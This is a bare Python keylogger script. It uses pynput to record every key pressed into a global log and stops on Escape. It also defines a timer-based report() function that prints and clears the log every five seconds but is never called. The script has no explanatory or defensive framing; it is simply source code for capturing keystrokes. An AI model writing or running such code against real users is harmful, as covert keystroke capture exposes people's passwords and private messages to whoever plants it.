#!/usr/bin/env python3

from pynput import keyboard
import threading

log = ""


def process_key_press(key):
    global log
    try:
        log = log + " " + str(key.char)
    except AttributeError:
        if str(key) == "Key.space":
            log += " "
        elif str(key) == "Key.esc":
            return False
        else:
            log = log + " " + str(key) + " "


def report():
    global log
    print(log)
    log = ""
    timer = threading.Timer(5, report)
    timer.start()


keyboard_listener = keyboard.Listener(on_press=process_key_press)
with keyboard_listener:
    keyboard_listener.join()
